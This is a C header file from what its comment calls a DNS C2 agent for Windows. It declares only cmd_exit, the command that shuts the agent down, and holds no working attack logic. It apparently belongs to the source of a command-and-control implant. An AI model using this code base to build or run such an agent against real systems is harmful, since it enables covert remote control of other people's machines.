/**
 * exit.h - Exit command for DNS C2 Agent
 */

 #ifndef EXIT_H
 #define EXIT_H
 
 #include <windows.h>
 
 /**
  * Exit the agent
  * 
  * @param args Unused
  * @return The result of the command (must be freed by caller)
  */
 char* cmd_exit(const char* args);
 
 #endif // EXIT_H
 